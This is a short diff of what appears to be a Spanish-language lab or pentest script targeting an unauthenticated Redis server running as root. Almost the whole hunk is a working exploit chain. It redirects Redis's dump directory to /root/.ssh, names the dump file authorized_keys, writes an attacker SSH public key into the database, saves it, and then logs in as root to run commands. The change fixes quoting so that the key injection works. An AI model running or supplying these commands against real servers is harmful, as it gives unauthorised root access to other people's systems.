@@ -44,7 +44,7 @@ Vulnerabilidad: Redis sin autenticación, ejecutándose como root.
   redis-cli -h $M2 -p $REDIS_PORT PING
   redis-cli -h $M2 CONFIG SET dir /root/.ssh
   redis-cli -h $M2 CONFIG SET dbfilename authorized_keys
-  printf '\\n\\n%s\\n\\n' "\$(cat $KEY.pub)" | redis-cli -h $M2 -x SET x
+  printf '\n\n%s\n\n' "$(cat $KEY.pub)" | redis-cli -h $M2 -x SET lab_pwn
   redis-cli -h $M2 SAVE
   ssh -i $KEY root@$M2 'id; hostname'
 EOF
